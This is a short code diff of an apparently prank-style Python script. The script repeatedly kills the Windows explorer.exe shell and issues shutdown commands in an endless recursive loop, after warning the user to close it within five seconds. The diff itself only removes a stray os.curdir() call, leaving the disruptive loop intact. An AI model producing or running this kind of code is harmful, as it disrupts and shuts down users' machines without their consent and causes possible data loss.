@@ -8,9 +8,9 @@ def program():
     os.system("Taskkill /F /IM explorer.exe")
     os.system("shutdown  /t 0")
     os.system("shutdown /a")
-    os.curdir()
     program()
 print("If u dont close, will start in 5 seconds.")
 time.sleep(5)
 
 program()
+
